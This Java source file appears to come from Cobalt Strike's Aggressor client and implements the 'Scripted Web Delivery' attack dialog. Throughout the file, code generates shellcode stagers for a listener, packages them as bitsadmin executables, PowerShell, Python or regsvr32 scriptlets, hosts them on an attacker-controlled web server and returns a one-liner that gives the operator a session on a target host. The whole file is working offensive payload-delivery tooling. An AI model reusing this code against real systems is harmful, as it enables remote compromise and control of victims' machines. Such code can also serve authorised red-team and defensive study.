package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.*;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;
import java.util.Map;

public class ScriptedWebDialog implements DialogListener,
        Callback {
    protected JFrame dialog = null;
    protected Map options = null;
    protected AggressorClient client;
    protected String proto;

    public ScriptedWebDialog(AggressorClient client) {
        this.client = client;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.options = options;
        String port = options.get("port") + "";
        String uri = options.get("uri") + "";
        String host = options.get("host") + "";
        String stype = DialogUtils.string(options, "type");
        boolean ssl = DialogUtils.bool(options, "ssl");
        this.proto = ssl ? "https://" : "http://";
        String type = options.get("output") + "";
        String listener = options.get("listener") + "";
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), listener);
        if ("bitsadmin".equals(stype)) {
            byte[] data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32.exe");
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(host, Integer.parseInt(port), ssl, uri, CommonUtils.bString(data), "application/octet-stream", "Scripted Web Delivery (bitsadmin)"), this);
        } else if ("powershell".equals(stype)) {
            byte[] data = new ResourceUtils(this.client).buildPowerShell(stager);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(host, Integer.parseInt(port), ssl, uri, new PowerShellUtils(this.client).PowerShellCompress(data), "text/plain", "Scripted Web Delivery (powershell)"), this);
        } else if ("python".equals(stype)) {
            byte[] stager64 = DataUtils.shellcodeX64(GlobalDataManager.getGlobalDataManager(), listener);
            byte[] data = new ResourceUtils(this.client).buildPython(stager, stager64);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(host, Integer.parseInt(port), ssl, uri, new ResourceUtils(this.client).PythonCompress(data), "text/plain", "Scripted Web Delivery (python)"), this);
        } else if ("regsvr32".equals(stype)) {
            byte[] data = new ArtifactUtils(this.client).buildSCT(stager);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(host, Integer.parseInt(port), ssl, uri, CommonUtils.bString(data), "text/plain", "Scripted Web Delivery (regsvr32)"), this);
        } else {
            DialogUtils.showError("Unknown type: " + stype);
        }
    }

    @Override
    public void result(String method, Object data) {
        String status = data + "";
        String port = this.options.get("port") + "";
        String uri = this.options.get("uri") + "";
        String host = this.options.get("host") + "";
        String type = this.options.get("type") + "";
        if ("success".equals(status)) {
            DialogUtils.startedWebService("Scripted Web Delivery", CommonUtils.OneLiner(this.proto + host + ":" + port + uri, type));
        } else {
            DialogUtils.showError("Unable to start web server:\n" + status);
        }
    }

    public void show() {
        this.dialog = DialogUtils.dialog("Scripted Web Delivery", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.set("uri", "/a");
        controller.set("port", "80");
        controller.set("host", DataUtils.getLocalIP(this.client.getData()));
        controller.set("type", "powershell");
        controller.text("uri", "URI Path:", 10);
        controller.text("host", "Local Host:", 20);
        controller.text("port", "Local Port:", 20);
        controller.listener("listener", "Listener:", this.client.getConnection(), this.client.getData());
        controller.combobox("type", "Type:", CommonUtils.toArray("bitsadmin, powershell, python, regsvr32"));
        controller.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
        JButton ok = controller.action("Launch");
        JButton help = controller.help("https://www.cobaltstrike.com/help-scripted-web-delivery");
        this.dialog.add(DialogUtils.description("This attack hosts an artifact that delivers a Cobalt Strike payload. The provided one-liner will allow you to quickly get a session on a target host."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

